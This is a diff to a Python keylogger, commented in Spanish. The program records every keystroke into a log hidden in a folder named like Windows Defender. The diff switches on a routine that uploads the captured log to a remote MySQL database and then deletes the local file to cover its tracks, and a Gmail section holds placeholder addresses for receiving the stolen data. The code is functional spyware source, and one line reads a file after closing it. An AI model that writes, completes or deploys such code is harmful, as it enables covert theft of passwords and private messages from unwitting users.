@@ -213,12 +213,12 @@ def KeyLogger():
             "['´']": "´",                     #
             "<110>": ".",                     #
             "None<110>": ".",                 #
-            "Key.alt_l": " [Alt L] ",         #
-            "Key.alt_r": " [Alt R] ",
-            "Key.shift_r": " [Shift R] ",
-            "Key.shift":   " [Shift L] ",
-            "Key.ctrl_r": " [Control R] ",    #
-            "Key.ctrl_l": " [Control L] ",    #
+            "Key.alt_l": " [AltL] ",         #
+            "Key.alt_r": " [AltR] ",
+            "Key.shift_r": " [ShiftR] ",
+            "Key.shift":   " [ShiftL] ",
+            "Key.ctrl_r": " [CtrlR] ",    #
+            "Key.ctrl_l": " [CtrlL] ",    #
             "Key.right" : " [Right] ",                 #
             "Key.left"  : " [Left] ",                  #
             "Key.up"    : " [Up]",                    #
@@ -226,27 +226,27 @@ def KeyLogger():
             #"'\x16'"  : " [Pegó] ",
             #"'\x18'"  : " [Cortar] ", 
             #"'\x03'"  : " [Copiar] ", 
-            "Key.caps_lock"  : " [Mayus lock] ",  
+            "Key.caps_lock"  : " [MayusLock] ",  
             #"Key.media_previous"    : " ♫ ",     #
             #"Key.media_next"        : " ♫→ ",         #
             #"Key.media_play_pause"  : " ■ ♫ ■ ",#
-            "Key.cmd"               : " [Windows] "          #
+            "Key.cmd"               : " [W] "          #
         }
         return switcher.get(argument, "")
 
     try:        # Intenta crear el archivo
         log = os.environ.get('pylogger_file', os.path.expanduser(logKeyPath()+LogName()) )
-        T = datetime.datetime.now()
-        getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
+        #T = datetime.datetime.now()
+        #getTime = "Fecha:      ["+  T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + "]\nHora:       [" + T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")+ " con " + T.strftime("%S") +" Segundos]\n"
 
         with open (log, "a") as f:
-            f.write("\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
+            f.write("")#\n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
     except: # Si no puede crear el archivo, crea el directorio faltante
         CreateDir()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender
     
     def on_press(key):
         with open(log, "a") as f:
-            print(str(key))
+            #print(str(key)) <= habilitar Solo antiDebug
             if (len(str(key))) <= 3:
                 print("Se oprimio la tecla: "+KeyConMin(str(key))) 
                 f.write(KeyConMin(str(key)))
@@ -392,7 +392,6 @@ def passS():                   # <<== Contraseña del correo
 def ReceiveE():
     #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
     return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-
 # ************ Fin Zona Gmail ************* 
 
 # ************ Start Zone DATABASE ************* 
@@ -441,23 +440,29 @@ def SendDataBaseMySQL():
         print("Error al iniciar sesión [DataBase]")
 
     def UpdateUser():
+        f = open (logKeyPath()+LogName(),'r')
+        print(f.read())
+        f.close()
+
         T = datetime.datetime.now()
         currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-        sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','Datos nuevos')"    # Inserta nuevos datos 
+        sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+f.read()+"')"    # Inserta nuevos datos 
         #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
         try:
             cursor.execute(sql) # Ejecuta virtual
             connection.commit() # Se guardan virtual 
             print("[Database] Se subieron los datos correctamente")
+            # Elimina Registro Key
+            os.remove(logKeyPath()+LogName())
         except:
             print("[Database] Error al subir los datos")
             pass
         
-    #UpdateUser()
+    UpdateUser()
 
 
 
-    print("")
+    print("Finalizo todo...")
 
 
 
